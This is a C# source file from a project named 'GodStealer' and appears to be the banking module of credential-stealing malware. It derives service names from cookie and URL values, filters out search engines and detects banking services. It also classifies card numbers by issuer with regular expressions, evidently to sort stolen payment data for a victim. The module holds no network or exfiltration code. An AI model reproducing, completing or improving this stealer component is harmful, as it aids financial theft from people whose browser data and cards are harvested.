﻿using System;
using System.Collections.Generic;
using System.Text.RegularExpressions;

namespace GodStealer
{
    internal sealed class Banking
    {
        private static char[] InvalidChars = System.IO.Path.GetInvalidPathChars();

        // Add value to list
        private static bool AppendValue(string value, List<string> domains)
        {
            string domain = value
                .Replace("www.", "").ToLower();
            // Check for invalid chars
            foreach (char InvalidChar in InvalidChars)
                if (domain.Contains(InvalidChar.ToString()))
                    return false;
            // Remove search results
            if (
                domain.Contains("google") ||
                domain.Contains("bing") ||
                domain.Contains("yandex") ||
                domain.Contains("duckduckgo"))
                return false;
            // If cookie value
            if (domain
                .StartsWith("."))
                domain = domain.Substring(1);
            // Get hostname from url
            try {
                domain = new Uri(domain).Host;
            } catch (UriFormatException) { }
            // Remove .com, .org
            domain = System.IO.Path.GetFileNameWithoutExtension(domain);
            domain = domain.Replace(".com", "").Replace(".org", "");
            // Check if domain already exists in list
            foreach (string domainValue in domains)
                if (domain.ToLower().Replace(" ", "").Contains(domainValue.ToLower().Replace(" ", "")))
                    return false;
            // Convert first char to upper-case
            domain = System.Globalization.CultureInfo.CurrentCulture.TextInfo.ToTitleCase(domain);
            domains.Add(domain);
            return true;
        }


        private static void DetectServices(string value, string[] toscan, List<string> detected, bool ondetect)
        {
            foreach (string service in toscan)
                if (value.ToLower().Contains(service) && value.Length < 25)
                    if (AppendValue(value, detected)) { ondetect = true; return; }
        }

       


        // Regex for credit cards types detection by number
        private static Dictionary<string, Regex> CreditCardTypes = new Dictionary<string, Regex>()
        {
            {"Amex Card", new Regex(@"^3[47][0-9]{13}$") },
            {"BCGlobal", new Regex(@"^(6541|6556)[0-9]{12}$") },
            {"Carte Blanche Card", new Regex(@"^389[0-9]{11}$") },
            {"Diners Club Card", new Regex(@"^3(?:0[0-5]|[68][0-9])[0-9]{11}$") },
            {"Discover Card", new Regex(@"6(?:011|5[0-9]{2})[0-9]{12}$") },
            {"Insta Payment Card", new Regex(@"^63[7-9][0-9]{13}$") },
            {"JCB Card", new Regex(@"^(?:2131|1800|35\\d{3})\\d{11}$") },
            {"KoreanLocalCard", new Regex(@"^9[0-9]{15}$") },
            {"Laser Card", new Regex(@"^(6304|6706|6709|6771)[0-9]{12,15}$") },
            {"Maestro Card", new Regex(@"^(5018|5020|5038|6304|6759|6761|6763)[0-9]{8,15}$") },
            {"Mastercard", new Regex(@"5[1-5][0-9]{14}$") },
            {"Solo Card", new Regex(@"^(6334|6767)[0-9]{12}|(6334|6767)[0-9]{14}|(6334|6767)[0-9]{15}$") },
            {"Switch Card", new Regex(@"^(4903|4905|4911|4936|6333|6759)[0-9]{12}|(4903|4905|4911|4936|6333|6759)[0-9]{14}|(4903|4905|4911|4936|6333|6759)[0-9]{15}|564182[0-9]{10}|564182[0-9]{12}|564182[0-9]{13}|633110[0-9]{10}|633110[0-9]{12}|633110[0-9]{13}$") },
            {"Union Pay Card", new Regex(@"^(62[0-9]{14,17})$") },
            {"Visa Card", new Regex(@"4[0-9]{12}(?:[0-9]{3})?$") },
            {"Visa Master Card", new Regex(@"^(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14})$") },
            {"Express Card", new Regex(@"3[47][0-9]{13}$") },
        };

        // Detect credit cards type by number
        public static string DetectCreditCardType(string number)
        {
            foreach (KeyValuePair<string, Regex> dictonary in CreditCardTypes)
                if (dictonary.Value.Match(number.Replace(" ", "")).Success)
                    return dictonary.Key;

            return "Unknown";
        }

    }
}
